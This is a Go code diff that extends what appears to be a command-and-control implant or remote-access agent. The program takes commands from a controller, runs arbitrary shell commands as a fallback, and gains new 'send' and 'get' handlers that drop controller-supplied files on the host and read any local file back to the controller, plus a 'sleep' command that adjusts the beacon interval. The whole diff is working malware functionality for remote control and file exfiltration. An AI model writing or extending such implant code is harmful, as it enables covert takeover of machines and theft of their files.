@@ -13,6 +13,8 @@ import (
 	"os/exec"
 	"os/user"
 	"runtime"
+	"strconv"
+	"strings"
 	"time"
 
 	"github.com/mitchellh/go-ps"
@@ -51,7 +53,7 @@ func main() {
 
 		if messageContainsCommand(message) {
 			for i, v := range message.Commands {
-				message.Commands[i].Response = execCommand(v.Request)
+				message.Commands[i].Response = execCommand(v.Request, i)
 			}
 		}
 
@@ -59,7 +61,7 @@ func main() {
 	}
 }
 
-func execCommand(command string) (response string) {
+func execCommand(command string, i int) (response string) {
 
 	separateCommand := helpers.CommandsSplit(command)
 	baseCommando := separateCommand[0]
@@ -77,6 +79,14 @@ func execCommand(command string) (response string) {
 		response = whoami()
 	case "ps":
 		response = processList()
+	case "send":
+		response = saveFile(message.Commands[i].File)
+	case "get":
+		response = sendFile(message.Commands[i].Request, i)
+	case "sleep":
+		time := strings.TrimSpace(separateCommand[1])
+		heartBeat, _ = strconv.Atoi(time)
+		response = "Current sleep: " + time + " seconds"
 	default:
 		response = shellExecution(command)
 	}
@@ -135,6 +145,37 @@ func shellExecution(command string) (resp string) {
 	} else {
 		resp = "System not implemented"
 	}
+
+	return resp
+}
+
+func saveFile(file global.File) (resp string) {
+	resp = "Send file success!"
+
+	fileName := strings.Split(file.Name, "/")
+	err := os.WriteFile(fileName[len(fileName)-1], file.Content, 0644)
+
+	if err != nil {
+		resp = "Send file error: " + err.Error()
+	}
+
+	return resp
+}
+
+func sendFile(fullCommand string, i int) (resp string) {
+	resp = "Get file success!"
+
+	separateCommand := helpers.CommandsSplit(fullCommand)
+
+	var err error
+	message.Commands[i].File.Content, err = os.ReadFile(separateCommand[1])
+
+	if err != nil {
+		resp = "Open file error: " + err.Error()
+		message.Commands[i].File.Error = true
+	}
+
+	message.Commands[i].File.Name = separateCommand[1]
 
 	return resp
 }
